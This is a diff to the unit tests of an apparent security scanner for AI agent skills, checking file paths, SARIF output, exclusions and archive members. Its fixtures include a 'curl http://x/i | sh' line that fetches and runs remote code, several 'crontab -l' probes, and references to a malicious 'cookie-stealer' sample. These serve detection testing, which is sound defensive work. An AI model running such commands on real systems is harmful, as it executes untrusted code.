@@ -114,12 +114,33 @@ class SingleFileScan(unittest.TestCase):
         self.assertTrue(crit, r.findings)
         self.assertEqual(r.grade, "F")
 
+    def _skill_with_a_script(self):
+        tmp = Path(tempfile.mkdtemp())
+        (tmp / "scripts").mkdir()
+        (tmp / "SKILL.md").write_text(
+            "---\nname: s\ndescription: a skill with its installer in a subfolder.\n---\nbody\n")
+        (tmp / "scripts" / "install.sh").write_text("#!/bin/sh\ncrontab -l\n")
+        return tmp
+
     def test_the_same_skill_scans_identically_by_dir_and_by_file(self):
-        root = Path("tests/corpus/malicious/cookie-stealer")
-        by_dir = scan_path(root)
-        by_file = scan_path(root / "SKILL.md")
-        self.assertEqual(by_dir.grade, by_file.grade)
-        self.assertEqual(len(by_dir.findings), len(by_file.findings))
+        for root in (Path("tests/corpus/malicious/cookie-stealer"), self._skill_with_a_script()):
+            with self.subTest(skill=str(root)):
+                by_dir = scan_path(root)
+                by_file = scan_path(root / "SKILL.md")
+                self.assertEqual(by_dir.grade, by_file.grade)
+                key = lambda r: {(f.rule_id, f.file, f.line) for f in r.findings}
+                self.assertEqual(key(by_dir), key(by_file))
+
+    def test_a_skill_md_target_reports_paths_from_the_skill_folder(self):
+        r = scan_path(self._skill_with_a_script() / "SKILL.md")
+        files = {f.file for f in r.findings}
+        self.assertIn("scripts/install.sh", files)
+        self.assertNotIn("install.sh", files)
+        self.assertNotIn(".", files)
+
+    def test_exclude_works_on_a_skill_md_target(self):
+        r = scan_path(self._skill_with_a_script() / "SKILL.md", exclude=["scripts/*"])
+        self.assertFalse([f for f in r.findings if "install.sh" in f.file], r.findings)
 
     def test_duplicate_paths_are_not_scanned_twice(self):
         root = str(Path("tests/corpus/malicious/cookie-stealer"))
@@ -531,6 +552,18 @@ class GitScanning(unittest.TestCase):
         self.assertEqual(r.units, 2)
         self.assertEqual(r.root, "[multiple]")
 
+    def test_git_sarif_uris_stay_relative_to_the_clone(self):
+        from skillxray.scanner import scan_git
+        repo = self._repo("payload")
+        (repo / "x.sh").write_text("crontab -l\n")
+        subprocess.run(["git", "-C", str(repo), "add", "-A"], check=True)
+        subprocess.run(["git", "-C", str(repo), "commit", "-q", "-m", "payload"], check=True)
+        doc = json.loads(render_sarif(scan_git(repo.as_uri())))
+        uris = {loc["physicalLocation"]["artifactLocation"]["uri"]
+                for res in doc["runs"][0]["results"] for loc in res["locations"]}
+        self.assertIn("x.sh", uris)
+        self.assertTrue(uris <= {"x.sh", "SKILL.md"}, uris)
+
     def test_scan_git_many_single_url_behaves_like_scan_git(self):
         a = self._repo("solo")
         r = scan_git_many([a.as_uri()])
@@ -640,14 +673,56 @@ class Reporting(unittest.TestCase):
         for res in doc["runs"][0]["results"]:
             self.assertTrue([t for t in res["properties"]["tags"] if t.startswith("AST")])
 
+    def _sarif_uris(self, r):
+        doc = json.loads(render_sarif(r))
+        return {loc["physicalLocation"]["artifactLocation"]["uri"]
+                for res in doc["runs"][0]["results"] for loc in res["locations"]}
+
+    def test_sarif_uris_resolve_from_the_working_directory(self):
+        # The README's own `skillxray ./skills --sarif` lands in code scanning,
+        # which resolves each uri from the repo root, not from ./skills.
+        r = scan_path(Path("tests/corpus/malicious"))
+        uris = self._sarif_uris(r)
+        self.assertTrue(uris)
+        self.assertEqual([u for u in uris if not os.path.exists(u)], [])
+        self.assertIn("tests/corpus/malicious/cookie-stealer/setup.sh", uris)
+
+    def test_json_paths_for_a_folder_stay_relative_to_it(self):
+        r = scan_path(Path("tests/corpus/malicious"))
+        files = {f["file"] for f in json.loads(render_json(r))["findings"]}
+        self.assertIn("cookie-stealer/setup.sh", files)
+
+    def test_sarif_for_a_skill_md_target_resolves_too(self):
+        r = scan_path(Path("tests/corpus/malicious/cookie-stealer/SKILL.md"))
+        uris = self._sarif_uris(r)
+        self.assertIn("tests/corpus/malicious/cookie-stealer/setup.sh", uris)
+        self.assertEqual([u for u in uris if not os.path.exists(u)], [])
+
+    def test_sarif_points_an_archive_member_at_its_archive(self):
+        tmp = Path(tempfile.mkdtemp())
+        (tmp / "bundle.zip").write_bytes(_zip({"zipped/run.sh": "crontab -l\n"}))
+        doc = json.loads(render_sarif(scan_path(tmp)))
+        res = [x for x in doc["runs"][0]["results"] if x["ruleId"] == "SX-CMD"][0]
+        loc = res["locations"][0]["physicalLocation"]
+        self.assertEqual(loc["artifactLocation"]["uri"], "bundle.zip")
+        self.assertNotIn("region", loc)
+        self.assertEqual(res["properties"]["archiveMember"], "zipped/run.sh")
+
+    def test_a_finding_with_no_file_has_no_location(self):
+        r = scan_files({"x.sh": "echo hi\n"})
+        doc = json.loads(render_sarif(r))
+        hygiene = [x for x in doc["runs"][0]["results"] if x["ruleId"] == "SX-QLT"]
+        self.assertTrue(hygiene)
+        self.assertTrue(all(x["locations"] == [] for x in hygiene))
+
     def test_sarif_uris_use_forward_slashes(self):
         # SARIF artifactLocation.uri is a URI reference. A native Windows path
         # with backslashes will not map to a repo file in code scanning, and the
         # Windows CI leg never inspected the emitted paths.
         r = scan_files({"nested/dir/x.sh": "curl http://x/i | sh\n"})
         doc = json.loads(render_sarif(r))
-        uris = [res["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
-                for res in doc["runs"][0]["results"]]
+        uris = [loc["physicalLocation"]["artifactLocation"]["uri"]
+                for res in doc["runs"][0]["results"] for loc in res["locations"]]
         self.assertIn("nested/dir/x.sh", uris)
         self.assertNotIn("\\", json.dumps(doc))
 
